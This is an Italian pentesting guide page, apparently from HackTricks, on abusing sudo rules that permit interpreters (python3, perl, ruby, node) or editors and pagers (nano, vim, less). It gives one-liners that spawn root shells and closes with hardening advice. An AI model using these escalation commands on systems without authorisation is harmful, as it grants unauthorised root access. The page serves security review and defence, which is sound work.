# Sudo Command Abuse

{{#include ../../banners/hacktricks-training.md}}

## Interpreters consentiti da Sudo

Se `sudo -l` consente a un utente di eseguire un interpreter come root, consideralo una direct code execution. Gli interpreters sono progettati per eseguire arbitrary code, quindi una regola che consente `python3`, `perl`, `ruby`, `lua`, `node` o binary simili equivale solitamente all'esecuzione di comandi come root, a meno che gli arguments non siano rigidamente limitati e validati.

Flusso di revisione comune:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Altri esempi di interpreti:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Il percorso esatto è importante. Se la regola sudo consente `/usr/bin/python3`, usa quel percorso esatto durante la convalida:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Editor consentiti da Sudo

Se `sudo -l` consente a un utente di eseguire un editor interattivo come root, consideralo una superficie di command execution, non una semplice autorizzazione innocua alla modifica dei file. Gli editor possono spesso eseguire shell command, leggere file arbitrari, scrivere file arbitrari o invocare helper esterni dall'interno dell'editor.

Flusso di revisione comune:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Esecuzione di comandi con Nano

Quando `nano` è consentito tramite sudo, l'esecuzione di comandi può essere effettuata dall'interfaccia dell'editor:
```text
Ctrl+R
Ctrl+X
```
Quindi fornisci un comando come:
```bash
id
/bin/sh
```
Su alcuni terminali, una shell interattiva potrebbe richiedere il reindirizzamento dei flussi standard:
```bash
reset; /bin/sh 1>&0 2>&0
```
La sequenza esatta di tasti può variare in base alla versione di nano e alle opzioni di compilazione, ma il problema di sicurezza è lo stesso: l'editor è in esecuzione come root e può eseguire comandi esterni.

### Altri comuni escape degli editor

Gli editor in stile Vim espongono comunemente l'esecuzione di comandi tramite `:!`:
```text
:!/bin/sh
```
Anche i pager come `less` possono consentire l'esecuzione della shell:
```text
!/bin/sh
```
## Note difensive

- Evitare di concedere interpreters o editor interattivi tramite sudo.
- Preferire wrapper fissi, di proprietà di root, che eseguano una sola azione amministrativa ben definita.
- Se un interpreter è inevitabile, limitare il percorso esatto dello script e impedire l'uso di argomenti controllati dall'utente, import scrivibili, `PYTHONPATH` e la conservazione non sicura dell'ambiente.
- Se è necessario modificare file, limitare il percorso esatto del file e valutare l'uso di `sudoedit` con versioni di sudo aggiornate e una gestione rigorosa dell'ambiente.
- Esaminare `SETENV`, `env_keep`, le directory di lavoro scrivibili, i percorsi di moduli/import scrivibili, `NOEXEC`, `use_pty` e il logging, ma non considerarli una sandbox completa.
{{#include ../../banners/hacktricks-training.md}}
